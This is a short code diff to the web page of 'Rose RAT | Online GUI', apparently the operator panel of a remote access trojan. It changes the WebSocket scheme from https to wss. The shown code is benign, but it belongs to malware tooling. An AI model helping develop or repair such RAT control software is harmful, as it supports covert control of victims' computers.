@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Rose RAT | Online GUI</title>
     <script>
-        socket= new WebSocket('https://'+window.location.host+':5000');
+        socket= new WebSocket('wss://'+window.location.host+':5000');
         socket.onopen= function() {
             socket.send('hello');
             console.log('sent hello');
